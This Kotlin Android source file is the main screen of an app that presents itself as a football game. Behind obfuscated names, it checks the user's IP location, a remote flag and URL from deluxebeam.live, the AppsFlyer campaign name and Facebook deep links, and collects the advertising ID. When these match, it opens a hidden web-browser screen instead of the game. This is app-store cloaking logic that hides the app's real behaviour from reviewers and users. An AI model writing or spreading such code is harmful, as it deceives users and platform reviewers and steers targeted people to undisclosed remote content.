package com.gamegou.footballs

import android.content.Context
import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.facebook.applinks.AppLinkData
import com.gamegou.footballs.SingleMainClass.Companion.C1ftgtgttggtgtg
import com.gamegou.footballs.SingleMainClass.Companion.DEEPLfrfrrf55fggtghy
import com.gamegou.footballs.SingleMainClass.Companion.MAIN_IDdrfrrf8ftgt
import com.gamegou.footballs.SingleMainClass.Companion.appsCheckfrfrrf55ggtgt
import com.gamegou.footballs.SingleMainClass.Companion.linkfrfrrf
import com.gamegou.footballs.databinding.ActivityMainBinding
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.orhanobut.hawk.Hawk
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {

    lateinit var hyyhhyy: ActivityMainBinding

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        hyyhhyy = ActivityMainBinding.inflate(layoutInflater)
        setContentView(hyyhhyy.root)

        dddefrrfrrf55555(this)
        GlobalScope.launch(Dispatchers.IO) {
            frgtgtgtgthyyh5
        }

        AppsFlyerLib.getInstance()
            .init("ukGNpoEi7XdukjdgM9Ms6i", suuuuuuuuuukadefr5559888, applicationContext)
        AppsFlyerLib.getInstance().start(this)

    }

    private suspend fun yhyoyhjyftgyh(): String? {
        val retrofitBuilder = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://pro.ip-api.com/")
            .build()
            .create(ServiceApi::class.java)

        val gtjgitjt5656 = retrofitBuilder.getData().body()?.frfrrr
        return gtjgitjt5656

    }

    private fun frgyktohkyk66() {
        val fgttt = AdvertisingIdClient(applicationContext)
        fgttt.start()
        val gtgtgtgt = fgttt.info.id
        Hawk.put(MAIN_IDdrfrrf8ftgt, gtgtgtgt)
    }


    private suspend fun kilkpilkli65556(): String? {
        val retroBuildTwo = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://deluxebeam.live/")
            .build()
            .create(ServiceApi::class.java)

        val jujujjuju665 = retroBuildTwo.getDataDev().body()?.viewtgtttg
        val frfedfrrf = retroBuildTwo.getDataDev().body()?.frrrrr
        Hawk.put(appsCheckfrfrrf55ggtgt, frfedfrrf)
        Hawk.put(linkfrfrrf, jujujjuju665)
        val hyjuijikiki64454 = retroBuildTwo.getDataDev().body()?.hjpupjp
        return hyjuijikiki64454
    }

    private val frgtgtgtgthyyh5: Job = GlobalScope.launch(Dispatchers.IO) {
        val gthyfgt5: String = yhyoyhjyftgyh().toString()
        val gtgtgtgtftgt5 = kilkpilkli65556().toString()
        val ggttgtg66: String? = Hawk.get(DEEPLfrfrrf55fggtghy, "null")

        val lolomkk = Hawk.get(appsCheckfrfrrf55ggtgt, "null")
        var naming5555: String? = Hawk.get(C1ftgtgttggtgtg)
        frgyktohkyk66()
        if (lolomkk == "1") {

            val executorService = Executors.newSingleThreadScheduledExecutor()
            executorService.scheduleAtFixedRate({
                if (naming5555 != null) {

                    if (naming5555!!.contains("tdb2") || gtgtgtgtftgt5.contains(gthyfgt5) || ggttgtg66!!.contains("tdb2")) {
                        executorService.shutdown()
                        startActivity(Intent(this@MainActivity, VebBrovserActivity::class.java))
                        finish()
                    } else {
                        executorService.shutdown()
                        startActivity(Intent(this@MainActivity, StartGameeeeActivity::class.java))
                        finish()
                    }
                } else {
                    naming5555 = Hawk.get(C1ftgtgttggtgtg)
                }

            }, 0, 2, TimeUnit.SECONDS)
        } else if (gtgtgtgtftgt5.contains(gthyfgt5)) {
            startActivity(Intent(this@MainActivity, VebBrovserActivity::class.java))
            finish()
        } else {
            startActivity(Intent(this@MainActivity, StartGameeeeActivity::class.java))
            finish()
        }
    }

    fun dddefrrfrrf55555(context: Context) {
        AppLinkData.fetchDeferredAppLinkData(
            context
        ) { appLinkData: AppLinkData? ->
            appLinkData?.let {
                val papapapa = appLinkData.targetUri.host.toString()
                Hawk.put(DEEPLfrfrrf55fggtghy, papapapa)
            }
            if (appLinkData == null) {

            }
        }
    }

    private val suuuuuuuuuukadefr5559888 = object : AppsFlyerConversionListener {
        override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
            val dataGotten = data?.get("campaign").toString()
            Hawk.put(C1ftgtgttggtgtg, dataGotten)
        }

        override fun onConversionDataFail(p0: String?) {

        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {

        }

        override fun onAttributionFailure(p0: String?) {
        }
    }


}

